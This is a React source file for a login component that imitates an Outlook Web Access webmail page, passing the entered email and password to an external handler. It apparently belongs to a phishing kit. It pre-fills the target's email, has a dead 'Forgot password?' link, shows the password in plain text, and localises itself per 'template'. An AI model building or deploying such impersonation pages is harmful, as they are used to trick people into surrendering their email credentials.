'use client'

import { useState, useEffect } from 'react'
import { motion } from 'framer-motion'
import { AlertCircle, Key } from 'lucide-react'

// ════════════════════════════════════════════════════════════════════════════
// TYPES & INTERFACES
// ════════════════════════════════════════════════════════════════════════════

interface OWAServerTranslations {
  title: string
  subtitle: string
  tabWebmail: string
  tabMyServices: string
  loginPlaceholder: string
  passwordPlaceholder: string
  rememberMe: string
  forgotPassword: string
  loginButton: string
  errorEmail: string
  errorPassword: string
  errorLogin: string
}

// ════════════════════════════════════════════════════════════════════════════
// MAIN COMPONENT
// ════════════════════════════════════════════════════════════════════════════

interface OWAServerLoginFormProps {
  email?: string
  onSubmit: (email: string, password: string) => Promise<void>
}

export default function OWAServerLoginForm({ 
  email: initialEmail = '', 
  onSubmit,
}: OWAServerLoginFormProps) {
  // State
  const [activeTab, setActiveTab] = useState<'webmail' | 'services'>('webmail')
  const [email, setEmail] = useState(initialEmail)
  const [password, setPassword] = useState('')
  const [rememberMe, setRememberMe] = useState(false)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [translations, setTranslations] = useState<OWAServerTranslations | null>(null)

  // Fetch translations
  useEffect(() => {
    const fetchTranslations = async () => {
      try {
        const response = await fetch('/api/get-translations', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ template: 'owaServer' })
        })
        
        const data = await response.json()
        if (data.translations) {
          setTranslations(data.translations)
        }
      } catch (error) {
        console.error('Failed to load translations:', error)
        // Fallback to English
        setTranslations({
          title: 'Welcome to your Webmail',
          subtitle: '& Account Settings',
          tabWebmail: 'Webmail',
          tabMyServices: 'My Services',
          loginPlaceholder: 'Login (email)',
          passwordPlaceholder: 'Password',
          rememberMe: 'Remember me',
          forgotPassword: 'Forgot password?',
          loginButton: 'LOGIN',
          errorEmail: 'Please enter your email address',
          errorPassword: 'Please enter your password',
          errorLogin: 'Login failed. Please try again.'
        })
      }
    }
    
    fetchTranslations()
  }, [])

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError('')

    if (!translations) return

    if (!email) {
      setError(translations.errorEmail)
      return
    }

    if (!password) {
      setError(translations.errorPassword)
      return
    }

    setLoading(true)

    try {
      await onSubmit(email, password)
    } catch (err: any) {
      setError(err.message || translations.errorLogin)
    } finally {
      setLoading(false)
    }
  }

  if (!translations) {
    return (
      <div style={{ 
        minHeight: '100vh', 
        background: 'linear-gradient(135deg, #1e7fb8 0%, #2b95c8 100%)', 
        display: 'flex', 
        alignItems: 'center', 
        justifyContent: 'center' 
      }}>
        <div style={{ 
          width: '40px', 
          height: '40px', 
          border: '4px solid rgba(255,255,255,0.3)', 
          borderTop: '4px solid white', 
          borderRadius: '50%', 
          animation: 'spin 0.8s linear infinite' 
        }} />
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    )
  }

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #1e7fb8 0%, #2b95c8 100%)',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px',
    }}>
      <motion.div
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ duration: 0.5 }}
        style={{
          width: '100%',
          maxWidth: '500px',
        }}
      >
        {/* Icon */}
        <div style={{
          width: '100px',
          height: '100px',
          background: 'white',
          borderRadius: '50%',
          margin: '0 auto 30px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          boxShadow: '0 8px 24px rgba(0,0,0,0.2)',
        }}>
          <div style={{
            width: '60px',
            height: '60px',
            background: '#2b95c8',
            borderRadius: '4px',
            display: 'flex',
            flexDirection: 'column',
            padding: '6px',
            gap: '2px',
          }}>
            {/* Window bars */}
            <div style={{ display: 'flex', gap: '2px' }}>
              <div style={{ flex: 1, height: '8px', background: 'white', borderRadius: '1px' }} />
              <div style={{ flex: 1, height: '8px', background: 'white', borderRadius: '1px' }} />
              <div style={{ flex: 1, height: '8px', background: 'white', borderRadius: '1px' }} />
            </div>
            {/* Email envelope */}
            <div style={{
              flex: 1,
              background: 'white',
              borderRadius: '2px',
              position: 'relative',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '18px',
            }}>
              ✉️
            </div>
          </div>
        </div>

        {/* Title */}
        <h1 style={{
          fontSize: '28px',
          fontWeight: '300',
          color: 'white',
          textAlign: 'center',
          marginBottom: '8px',
          fontFamily: 'Arial, sans-serif',
          letterSpacing: '0.5px',
        }}>
          {translations.title}
        </h1>
        
        <h2 style={{
          fontSize: '24px',
          fontWeight: '300',
          color: 'white',
          textAlign: 'center',
          marginBottom: '40px',
          fontFamily: 'Arial, sans-serif',
        }}>
          {translations.subtitle}
        </h2>

        {/* Login Card */}
        <div style={{
          background: 'rgba(255, 255, 255, 0.15)',
          backdropFilter: 'blur(10px)',
          borderRadius: '8px',
          overflow: 'hidden',
          boxShadow: '0 8px 32px rgba(0,0,0,0.2)',
        }}>
          {/* Tabs */}
          <div style={{
            display: 'flex',
            background: 'rgba(255, 255, 255, 0.1)',
          }}>
            <button
              type="button"
              onClick={() => setActiveTab('webmail')}
              style={{
                flex: 1,
                padding: '16px',
                background: activeTab === 'webmail' ? 'rgba(255, 255, 255, 0.25)' : 'transparent',
                color: 'white',
                border: 'none',
                fontSize: '15px',
                fontWeight: '500',
                cursor: 'pointer',
                transition: 'background 0.2s',
                fontFamily: 'Arial, sans-serif',
                position: 'relative',
              }}
            >
              <span style={{ marginRight: '6px' }}>ⓘ</span>
              {translations.tabWebmail}
            </button>
            
            <button
              type="button"
              onClick={() => setActiveTab('services')}
              style={{
                flex: 1,
                padding: '16px',
                background: activeTab === 'services' ? 'rgba(255, 255, 255, 0.25)' : 'transparent',
                color: 'white',
                border: 'none',
                fontSize: '15px',
                fontWeight: '500',
                cursor: 'pointer',
                transition: 'background 0.2s',
                fontFamily: 'Arial, sans-serif',
              }}
            >
              <span style={{ marginRight: '6px' }}>ⓘ</span>
              {translations.tabMyServices}
            </button>
          </div>

          {/* Form */}
          <div style={{ padding: '40px' }}>
            <form onSubmit={handleSubmit}>
              {/* Email Field */}
              <div style={{ marginBottom: '16px', position: 'relative' }}>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder={translations.loginPlaceholder}
                  style={{
                    width: '100%',
                    padding: '14px 40px 14px 14px',
                    border: 'none',
                    borderRadius: '4px',
                    fontSize: '15px',
                    fontFamily: 'Arial, sans-serif',
                    color: '#333',
                    fontWeight: '500',
                    boxSizing: 'border-box',
                    outline: 'none',
                  }}
                />
                <Key style={{
                  position: 'absolute',
                  right: '14px',
                  top: '50%',
                  transform: 'translateY(-50%)',
                  width: '18px',
                  height: '18px',
                  color: '#666',
                }} />
              </div>

              {/* Password Field */}
              <div style={{ marginBottom: '20px' }}>
                <input
                  type="text"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder={translations.passwordPlaceholder}
                  style={{
                    width: '100%',
                    padding: '14px',
                    border: 'none',
                    borderRadius: '4px',
                    fontSize: '15px',
                    fontFamily: 'Arial, sans-serif',
                    color: '#333',
                    fontWeight: '500',
                    boxSizing: 'border-box',
                    outline: 'none',
                  }}
                />
              </div>

              {/* Remember Me & Forgot Password */}
              <div style={{
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center',
                marginBottom: '24px',
              }}>
                <label style={{
                  display: 'flex',
                  alignItems: 'center',
                  color: 'white',
                  fontSize: '14px',
                  cursor: 'pointer',
                  gap: '8px',
                  fontFamily: 'Arial, sans-serif',
                }}>
                  <input
                    type="checkbox"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                    style={{
                      width: '16px',
                      height: '16px',
                      cursor: 'pointer',
                    }}
                  />
                  {translations.rememberMe}
                </label>
                
                <a
                  href="#"
                  style={{
                    color: 'white',
                    fontSize: '14px',
                    textDecoration: 'none',
                    fontFamily: 'Arial, sans-serif',
                  }}
                >
                  {translations.forgotPassword}
                </a>
              </div>

              {/* Error Message */}
              {error && (
                <motion.div
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  style={{
                    padding: '12px',
                    background: 'rgba(232, 17, 35, 0.9)',
                    border: '1px solid rgba(255, 255, 255, 0.3)',
                    borderRadius: '4px',
                    marginBottom: '16px',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '8px',
                  }}
                >
                  <AlertCircle style={{ width: '16px', height: '16px', color: 'white', flexShrink: 0 }} />
                  <span style={{ fontSize: '13px', color: 'white', fontFamily: 'Arial, sans-serif' }}>
                    {error}
                  </span>
                </motion.div>
              )}

              {/* Login Button */}
              <button
                type="submit"
                disabled={loading}
                style={{
                  width: '100%',
                  padding: '16px',
                  background: loading ? '#7fa832' : '#8cbd27',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  letterSpacing: '1px',
                  cursor: loading ? 'not-allowed' : 'pointer',
                  fontFamily: 'Arial, sans-serif',
                  transition: 'background 0.2s',
                  boxShadow: '0 4px 12px rgba(0,0,0,0.2)',
                }}
                onMouseEnter={(e) => {
                  if (!loading) e.currentTarget.style.background = '#7fa832'
                }}
                onMouseLeave={(e) => {
                  if (!loading) e.currentTarget.style.background = '#8cbd27'
                }}
              >
                {loading ? (
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
                    <div style={{
                      width: '16px',
                      height: '16px',
                      border: '2px solid white',
                      borderTop: '2px solid transparent',
                      borderRadius: '50%',
                      animation: 'spin 0.8s linear infinite',
                    }} />
                    <span>Loading...</span>
                  </div>
                ) : (
                  translations.loginButton
                )}
              </button>
            </form>
          </div>
        </div>
      </motion.div>

      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  )
}







